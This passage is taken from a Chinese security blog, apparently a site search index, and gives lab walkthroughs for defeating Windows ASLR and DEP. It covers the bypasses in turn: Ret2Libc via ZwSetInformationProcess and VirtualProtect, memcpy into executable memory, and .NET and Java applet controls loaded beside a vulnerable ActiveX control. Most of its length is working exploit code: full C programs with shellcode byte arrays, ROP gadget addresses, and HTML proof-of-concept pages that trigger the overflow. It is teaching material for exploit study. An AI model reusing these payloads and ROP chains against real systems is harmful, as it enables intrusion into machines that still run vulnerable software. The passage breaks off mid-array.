PEB、TEB随机化测试: 4. ASLR存在的缺陷 映像随机化测试时各模块的入口点（Entry那列）地址的低位2个字节时不变的，也就是说映像随机化只是对加载基址的前2字节做了随机处理 堆栈随机化可以防止精准攻击，但是使用JMP ESP跳板、浏览器攻击中的heap spray等技术是不需要精准跳转 PEB与TEB的随机化的程度较差，而且即使做到完全随机，依然可以使用其他方法获取当前进程的PEB与TEB","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"ASLR","slug":"ASLR","permalink":"http://yoursite.com/tags/ASLR/"}]},{"title":"攻击DEP的方法(下)——可执行内存、.Net、Java Applet","date":"2017-07-12T02:01:59.000Z","path":"2017/07/12/攻击DEP的方法-下/","text":"1. 利用可执行内存1.1 实验代码 #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\x8A\\x17\\x84\\x7C\" // pop eax retn \"\\x0B\\x1A\\xBF\\x7C\" // pop pop retn \"\\xBA\\xD9\\xBB\\x7C\" // 修正EBP \"\\x5F\\x78\\xA6\\x7C\" // pop retn \"\\x08\\x00\\x14\\x00\" // 弹出机器码在可执行空间的起始地址，转入执行用 \"\\x00\\x00\\x14\\x00\" // 可执行内存空间地址，复制用 \"\\xBF\\x7D\\xC9\\x77\" // push esp jmp eax && 跳转至(pop pop retn地址) \"\\xFF\\x00\\x00\\x00\" // shellcode 长度 \"\\xAC\\xAF\\x94\\x7C\" // memcpy入口 \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\"; void test() { char str[176]; //__asm int 3 memcpy(str, shellcode, 450); } int main() { HINSTANCE hInst = LoadLibrary(\"shell32.dll\"); char temp[200]; test(); return 0; } 1.2 实验内容实验思路 禁用GS和SafeSEH test存在溢出 覆盖返回地址后，通过Ret2Libc技术，利用memcpy函数将shellcode复制到可读可写可执行区域 最后在这段可执行的内存空间中执行shellcode，实现DEP的绕过 实验环境 推荐使用环境 备注 操作系统 Windows 2003 SP2 DEP状态 Optout 编译器 VC 6.0 编译选项 禁用优化选项 build版本 debug版本 在OllyDbg中可以看出，在0x00140000的位置，Access和Initial Access都是RWE，这代表这一段是可读可写可执行的内存，长度为0x1000。 源内存起始地址 [ebp+0xC]，用push esp jmp eax指令地址来填充，push esp后这个位置会覆盖为当前esp，以实现源内存起始地址的动态获取 复制字符串长度：0xFF [ebp+0x10] 目的地址0x00140000 [ebp+0x8] 实验中，溢出字符串起始地址0x0012FDB0，返回地址0x0012FE68pop eax retn地址:0x7C84178Apop pop retn地址:0x7CBF1A0B(pop ebx pop edi retn)修正EBP retn 4地址:0x7CBBD9BA(push esp pop ebp retn 4)pop ecx retn地址:0x7CA6785Fpush esp jmp eax地址:0x77C97DBF(用于跳转)memcpy入口地址:0x7C94AFAC 2. 利用.NET实验支持: 具有溢出漏洞的ActiveX控件 包含shellcode的.NET控件 可以触发ActiveX控件中溢出漏洞的POC页面 2.1 ActiveX控件ActiveX控件 void CVulnerAX_DEPCtrl::test(LPCTSTR str) { // AFX_MANAGE_STATE(AfxGetStaticModuleState()); // TODO: Add your dispatch handler code here printf(\"aaaa\"); char dest[100]; sprintf(dest, \"%s\", str); } 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 编译器 Visual Studio 2008 优化 禁用优化选项 MFC 在静态库中使用MFC 工程属性-&gt;General-&gt;Use of MFC 字符集 使用Unicode字符集 工程属性-&gt;General-&gt;Character Set build版本 release版本 编译好控件之后，在实验机器上注册该ActiveX控件.regsvr32 2.2 包含shellcode的.NET控件在VS2008中C#下边建立一个DLL解决方案 包含shellcode的.NET控件代码 using System; using System.Collections.Generic; using System.Linq; using System.Text; namespace DEP_NETDLL { public class Class1 { public void Shellcode() { string shellcode = \"\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\" + \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\" + \"\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\" + \"\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\" + \"\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\" + \"\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\" + \"\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\" + \"\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\" + \"\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\" + \"\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\" + \"\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\" + \"\\uff53\\ufc57\\uff53\\uf857\"; } } } 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 编译器 Visual Studio 2008 基址 0x24240000 build版本 Debug版本 Release版本的优化会影响shellcode 设置DLL的基址方法如下：&quot;Project-&gt;Properties-&gt;Build-&gt;Advanced&quot; 2.3 POC及测试编译好DLL之后，需要将DLL和溢出ActiveX控件的POC页面放到同一目录下，并通过如下调试代码调用 &lt;object classID=\"DEP_NETDLL.dll#DEP_NETDLL.Shellcode\"&gt;&lt;/object&gt; Shellcode设置好后，就来设置POC页面，并将POC页面与.NET控件放到一台WEB服务器上，在实验机上访问这个POC页面，以触发ActiveX中的溢出漏洞，通过.NET控件绕过DEP。 POC页面如下 &lt;html&gt; &lt;body&gt; &lt;object classID=&quot;DEP_NETDLL.dll#DEP_NETDLL.Class1&quot;&gt;&lt;/object&gt; &lt;object classid=&quot;clsid:053CC2BD-8E24-4E01-A950-9FF689F40487&quot; id=&quot;test&quot;&gt;&lt;/object&gt; &lt;script&gt; var s = &quot;\\u9090&quot;; while(s.length &lt; 54){ s += &quot;\\u9090&quot;; } s += &quot;\\u24E2\\u2424&quot;; test.test(s); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 实验解释： 为了简单地反映绕过DEP的过程，本实验所攻击的ActiveX控件不启用GS 通过web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的.NET控件 ActiveX控件中的test函数存在典型的溢出 编译.NET控件的时候，我们设置DLL的基址，所以我们将函数的返回地址覆盖为.NET控件中的shellcode起始地址，进而转入shellcode执行 实验使用Unicode编码，在计算填充长度时要考虑Unicode与Ascii编码之间的长度差问题 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 DEP Optout 浏览器 IE6 当弹出下面所示对话框时用OllyDbg附加IE的进程，附加好后按一下F9键让程序继续运行。 然后转到DEP_NETDLL.dll的内存空间中查找shellcode的具体位置，然后进入该内存空间。 shellcode的起始地址0x242424DF。而我们填充的字符串起始地址0x01EFF534，函数返回地址0x01EFF5A0，所以填充108（0x6C）字节就可以覆盖返回地址。 令人意外的是，我们无法包含dll文件，使用了所有可能的办法，都无法在html中使用dll 3. 利用java applet实验支持: 具有溢出漏洞的ActiveX控件 包含shellcode的Java Applet控件 可以触发ActiveX控件中溢出漏洞的POC页面 3.1 ActiveX控件上一讲已经介绍 3.2 包含shellcode的Java Applet控件实验代码 import java.applet.*; import java.awt.*; public class Shellcode extends Applet{ public void init(){ Runtime.getRuntime().gc(); StringBuffer buffer = new StringBuffer(255); buffer.append(\"\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\\u9090\" + \"\\u68fc\\u0a6a\\u1e38\\u6368\\ud189\\u684f\\u7432\\u0c91\" + \"\\uf48b\\u7e8d\\u33f4\\ub7db\\u2b04\\u66e3\\u33bb\\u5332\" + \"\\u7568\\u6573\\u5472\\ud233\\u8b64\\u305a\\u4b8b\\u8b0c\" + \"\\u1c49\\u098b\\u698b\\uad08\\u6a3d\\u380a\\u751e\\u9505\" + \"\\u57ff\\u95f8\\u8b60\\u3c45\\u4c8b\\u7805\\ucd03\\u598b\" + \"\\u0320\\u33dd\\u47ff\\u348b\\u03bb\\u99f5\\ube0f\\u3a06\" + \"\\u74c4\\uc108\\u07ca\\ud003\\ueb46\\u3bf1\\u2454\\u751c\" + \"\\u8be4\\u2459\\udd03\\u8b66\\u7b3c\\u598b\\u031c\\u03dd\" + \"\\ubb2c\\u5f95\\u57ab\\u3d61\\u0a6a\\u1e38\\ua975\\udb33\" + \"\\u6853\\u6577\\u7473\\u6668\\u6961\\u8b6c\\u53c4\\u5050\" + \"\\uff53\\ufc57\\uff53\\uf857\"); } } 编译成class文件后，在Web中通过如下代码调用 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 Java JDK 1.4.2 目标版本 1.1 脱离JRE，在不具有JRE机器上也能执行 编译指令 javac 路径\\Shellcode.java -target 1.1 3.3 POC及其利用编译产生的Shellcode.class与POC放到同一目录下 POC页面代码 &lt;html&gt; &lt;body&gt; &lt;applet code=Shellcode.class width=300 height=50&gt;&lt;/applet&gt; &lt;script&gt;alert(\"开始溢出:\");&lt;/script&gt; &lt;object classid=\"clsid:053CC2BD-8E24-4E01-A950-9FF689F40487\" id=\"test\"&gt;&lt;/object&gt; &lt;script&gt; var s = \"\\u9090\"; while(s.length &lt; 54){ s += \"\\u9090\"; } s += \"\\u04FC\\u1001\"; test.test(s); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 代码解释: ActiveX不使用GS 通过Web页面同时加载具有溢出漏洞的ActiveX控件和包含shellcode的Java applet控件 java applet的内存空间中具有可执行权限，所以我们的shellcode有执行的机会 ActiveX控件中的test函数存在典型的溢出 将函数的返回地址覆盖为Java Applet中的.text段的shellcode起始地址，进而转入shellcoe中执行 实验用Unicode编码，需要考虑Unicode与Ascii之间的转换 实验环境： 推荐使用环境 备注 操作系统 Windows XP SP3 DEP状态 Optout JRE状态 启用 Java JDK 1.4.2 不要使用高版本的JRE，否则Java applet申请的内存不在IE进程中 浏览器 IE6 在浏览器中启用JRE：Internet选项-&gt;高级-&gt;Java-&gt;将Java……用于&lt;applet&gt; 当弹出“开始溢出”对话框时用OllyDbg附加IE进程，附加好后用F9继续执行。而shellcode地址可以通过OllyFindAddr插件中的Custom-Search搜索弹出对话框机器码的前4字节&quot;FC686A0A&quot;来定位shellcode","tags":[{"name":"DEP","slug":"DEP","permalink":"http://yoursite.com/tags/DEP/"},{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":".Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"攻击DEP的方法（上）——Ret2Libc","date":"2017-07-09T10:27:43.000Z","path":"2017/07/09/攻击DEP的方法-上/","text":"利用Ret2Libc挑战DEP让代码跳转到已经存在的系统函数中就不会被DEP拦截，Ret2libc攻击就是这个原理。（Return to libc）。简言之，就是shellcode的每条指令都可以在代码区中找到一条替代指令。但是这种方法太繁重，而且不好控制栈帧。 所以有以下三种方法： 通过跳转到ZwSetInformationProcess函数将DEP关闭后再转入shellcode执行 通过跳转到VirtualProtect函数将shellcode所在内存页设置爱为可执行状态，然后在转入shellcode执行 通过跳转到VirtualAlloc函数开辟一段具有执行权限的内存空间，然后将shellcode复制到段内存中执行 1. Ret2Libc之利用ZwSetInformationProcess1.1 ZwSetInformationProcess简介API函数ZwQueryInformationProcess和ZwSetInformationProcess进行查询和修改(有些资料中是NtQueryInformationProcess和NtSetInformationProcess)。 进程的DEP设置标识保存在KPROCESS结构中的_KEXECUTE_OPTIONS上。 _KEXECUTE_OPTIONS Pos0 ExecuteDisable: 1bit Pos1 ExecuteEnable: 1bit Pos2 DisableThunkEmulation: 1bit Pos3 Permanent: 1bit Pos4 ExecuteDispatchEnable: 1bit Pos5 ImageDispatchEnable: 1bit Pos6 Spare: 2bit 前4个bit与DEP有关，当前进程DEP开启时ExecuteDisable位为1，当前进程DEP关闭时ExecuteEnable位为1，DisableThunkEmulation是为了兼容ATL程序设置的，Permanent被置为1后表示这些标志位都不能被修改。 NtSetInformationProcess( IN HANDLE ProcessHandle, IN PROCESS_INFORMATION_CLASS ProcessInformationClass, IN PVOID ProcessInformation, IN ULONG ProcessInformationLength ); 第一个参数为进程句柄，设置为-1表示当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS；第四个参数为第三个参数的长度。于是，最终的参数设置为： ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE; ZwSetInformationProcess( NtCurrentProcess(), // (HANDLE)-1 ProcessExecuteFlags, // 0x22 &ExecuteFlags, // ptr to 0x2 sizeof(ExecuteFlags) // 0x4 ); 但是问题是函数参数中会包含0x00这样的截断字符。其实解决办法是微软的兼容性考虑：如果一个进程的Permanent位没设置，当它加载DLL时，系统会对这个DLL进行DEP兼容性检查，当存在兼容性问题时进程的DEP就会关闭。为此微软设立了LdrpCheckNXCompatibility函数，当符合下列条件之一进程的DEP就会被关闭： 当DLL受SafeDisc版权保护系统保护时 当DLL包含有.aspcak、.pcle、.sforce等字节时 Windows Vista下面当DLL包含在注册表&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\DllNXOptions&quot;键下边标识出不需启动DEP的模块时 以SafeDisc为例，查看Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程： 我们可以模拟这个过程，从0x7C93CD24入手关闭DEP，这个地址可通过OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3来搜索由于只有CMP AL,1 成立的情况下程序继续执行，所以需要一个指令将AL修改为1。将AL修改为1后让程序转到0x7C93CD24执行，在执行0x7C93CD6F处的RETN 4时DEP已经关闭，此时如果我们可以在RETN到一个精心构造的指令地址上，就可能转入shellcode中执行。 1.2 实验代码 #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x52\\xE2\\x92\\x7C\" // MOV EAX, 1 RETN地址 \"\\x85\\x8B\\x1D\\x5D\" // 修正EBP \"\\x19\\x4A\\x97\\x7C\" // 增大ESP \"\\xB4\\xC1\\xC5\\x7D\" // jmp esp \"\\x24\\xCD\\x93\\x7C\" // 关闭DEP代码的起始位置 \"\\xE9\\x33\\xFF\\xFF\\xFF\\x90\\x90\\x90\"; // 回跳指令 void test() { char str[176]; //__asm int 3 strcpy(str, shellcode); } int main() { HINSTANCE hInst = LoadLibrary(\"shell32.dll\"); char temp[200]; test(); return 0; } 1.3 Windows XP SP3实验内容实验思路： 为了更直观，将不启用GS和SafeSEH 函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖函数返回地址 将函数的返回地址覆盖为类似MOV AL,1 retn的指令，在将AL置1后转入0x7C93CD24关闭DEP DEP关闭后shellcode就可以正常执行 实验环境 推荐使用环境 备注 操作系统 Windows XP SP3 DEP状态 Optout 编译器 VC 6.0 编译选项 禁用优化选项 build版本 debug版本 由于不知道如何设置VC6.0的release版本的禁用编译优化选项，所以直接使用了Debug版本！其实查看是否被优化，可以设置int 3断点，查看后续指令是否按照正常顺序执行！ 从上面的OllyFindAddr插件中的Disable DEP-&gt;Disable DEP&lt;=XP SP3搜索结果可以看出，step2提供了符合“将AL置1并收回程序控制权”要求的指令。本次使用0x7C92E252。经过测试得到溢出字符串的起始地址:0x0012FDB0test函数的返回地址:0x0012FE64覆盖返回地址:0x7C92E252 调试发现，收回程序控制权之后，EIP修改为红框表示的值。所以为了让程序转入关闭DEP，需要返回地址后添加4字节0x7C93CD24。 重新编译调试，根据Windows XP SP3下LdrpCheckNXCompatibility关闭DEP的具体流程可以知道，在0x7c93CD29处的跳转是将ESI的值赋给[EBP-4]，但是EBP在溢出的时候被破坏了，目前EBP-4的位置并不可写入，所以程序异常。 所以在转入0x7C93CD24前，需将EBP指向一个可写的位置，为此可以通过PUSH ESP POP EBP RETN的指令将EBP定位到一个可写的位置，此指令在Disable DEP-&gt;Disable DEP&lt;=XP SP3的step3部分可以查看。但是若用此指令序列，若直接将ESP的值赋给EBP返回后，ESP相对于EBP位于高址位置，当有入栈操作时EBP-4可能被冲刷掉，所以用PUSH ESP POP EBP RETN 4来修正。此处使用的0x5D1D8B85处的地址。 当进入0x7C93CD33处的函数后，可以看到EBP-4中的内容已经被冲刷掉，内容修改为0x22，而_KEXECUTE_OPTIONS结构中只有前4位有关，0x22(00100010)代表关闭DEP。 虽然关闭了DEP，但是失去了进程的控制权。 当ESP小于EBP时，可以用减小ESP或者增大EBP的方法。由于shellcode位于内存低址，所以减小ESP可能会破坏shellcode，所以可以增大EBP，但是本实验找不到！变通的方法是增大ESP到安全位置，让EBP和ESP之间的空间足够大，这样压栈就不会冲刷EBP内容。可以用OllyFindAddr插件中的Overflow return address-&gt;POP RETN+N选项查找指令。我们选择0x7C974A19处的RETN 0x28来增大ESP。 这其中的关系有点绕，所以我也不打算继续讲了，需要我们进行实际调试！ 最终的shellcode组成 【操作7】168字节的弹出对话框机器码 12字节的0x90填充 【操作1】将AL置1，并重新掌握控制权 &quot;\\x52\\xE2\\x92\\x7C&quot; 【操作2】修正EBP &quot;\\x85\\x8B\\x1D\\x5D&quot; 【操作3】增大ESP &quot;\\x19\\x4A\\x97\\x7C&quot; 【操作5】 JMP ESP至最后一段 &quot;\\xB4\\xC1\\xC5\\x7D&quot; 【操作4】关闭DEP &quot;\\x24\\xCD\\x93\\x7C&quot; 【操作6】回跳至shellcode &quot;\\xE9\\x33\\xFF\\xFF\\xFF\\x90\\x90\\x90&quot; 1.4 Windows Server 2003 SP2实验内容我的实验是用的Windows Server 2003 Enterprise SP2 由于windows 2003 SP2对LdrpCheckNXCompatibility函数进行了少许修改，导致该函数在执行的过程中会对ESI指向的内存附近进行操作。所以可以利用push esp pop esi retn来调整ESI，这些指令在Disable DEP-&gt;Disable DEP&gt;=2003 SP2搜索结果的step4部分。 变通的方法： 找到pop eax retn指令，并让程序转入该位置执行 找到一条pop esi retn指令，并保证在执行1中的pop eax时对它的地址位于栈顶，这就可以将地址放到eax中 找到push esp jmp eax指令，并转入执行 最终windows server 2003 sp2测试时对应的代码为： #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[] = \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\xE9\\x77\\xBE\\x77\" // 修正EBP \"\\x81\\x71\\xBA\\x7C\" // pop eax retn \"\\x0A\\x1A\\xBF\\x7C\" // pop pop pop retn \"\\xA5\\x6F\\xBE\\x7C\" // pop esi retn \"\\xBF\\x7D\\xC9\\x77\" // push esp jmp eax \"\\x5F\\xFB\\x87\\x7C\" // retn 0x30 \"\\x17\\xF5\\x96\\x7C\" // 关闭DEP代码的起始位置 \"\\x23\\x1E\\x1A\\x7D\" // jmp esp \"\\xE9\\x27\\xFF\\xFF\\xFF\\x90\\x90\\x90\"; // jmp shellcode void test() { char str[176]; //__asm int 3 strcpy(str, shellcode); } int main() { HINSTANCE hInst = LoadLibrary(\"shell32.dll\"); char temp[200]; test(); return 0; } 溢出字符串开始地址：0x0012FDB0返回地址所在位置：0x0012FE64修正EBP地址：0x77BE77E9 (push esp pop ebp retn 4)pop eax retn所在地址: 0x7CbA7181由于retn 4，所以下面一条指令在0x7CBA7181后面4字节处，但是由于先pop eax，所以应该返回值0x7CBA7181后8字节处进行push esp jmp eax的操作: 0x77C97DBF然后通过jmp eax跳回去执行pop esi retn指令（0x7CBA7181后面4字节处）：0x7CBE6FA5 然后就是执行增大ESP，创造足够大的空间：0x7C87FB5F然后关闭DEP：0x7C96F517(这里直接进入了ZwSetInformationProcess所在路径) 不知道怎么回事，反正就是到了0x7CBA7181后，这时候使用pop pop pop retn：0x7CBF1A0A于是到了0x&amp;C96F517之后，这时候用jmp esp指令：0x7D1A1E23然后是回跳至shellcode位置，代码\\xE9\\x27\\xFF\\xFF\\xFF最后用\\x90\\x90\\x90填充 2. Ret2Libc之利用VirtualProctect2.1 VirtualProtect简介位于Kernel32.dll上的VirtualProtect是为了解决：Optout和AlwaysON模式下所有进程是默认开启DEP，而如果程序自身偶尔需要从堆栈中取指令，就会出错的问题。 其可修改指定内存的属性，包括是否可执行。 BOOL VirtualProtect{ LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect }; lpAddress：要改变属性的内存起始地址 dwSize：要改变属性的内存区域大小 flNewProtect：内存新的属性类型，设为PAGE_EXECUTE_READWRITE(0x40)是该内存也可读可写可执行 lpflOldProtect：内存原始属性类型保存地址 如果能够向下面方式布置，就可让shellcode可执行 BOOL VirtualProtect{ shellcode所在内存空间起始地址, shellcode大小, 0x40, 某个可写地址 }; 注意： 由于实验时参数包含0x00，为了方便，将strcpy改为memcoy 对shellcode内存空间起始地址的确定，不同机器会有变化，本实验用巧妙的栈帧构造动态确定shellcode所在内存空间起始地址 2.2 实验代码 #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #include &lt;windows.h&gt; char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\x8A\\x17\\x84\\x7c\" // pop eax retn \"\\x0A\\x1A\\xBF\\x7C\" // pop pop pop retn \"\\xBA\\xD9\\xBB\\x7C\" // 修正EBP \"\\x8B\\x17\\x84\\x7C\" //RETN \"\\x90\\x90\\x90\\x90\" \"\\xBF\\x7D\\xC9\\x77\" // push esp jmp eax(后来成为shellcode起始地址) \"\\xFF\\x00\\x00\\x00\" // 要修改的内存大小 \"\\x40\\x00\\x00\\x00\" // 可读可写可执行属性代码 \"\\xBF\\x7D\\xC9\\x77\" // push esp jmp eax(后来成为某个可写地址) \"\\x90\\x90\\x90\\x90\" \"\\x90\\x90\\x90\\x90\" \"\\xE8\\x1F\\x80\\x7C\" // 修改内存属性 \"\\x90\\x90\\x90\\x90\" 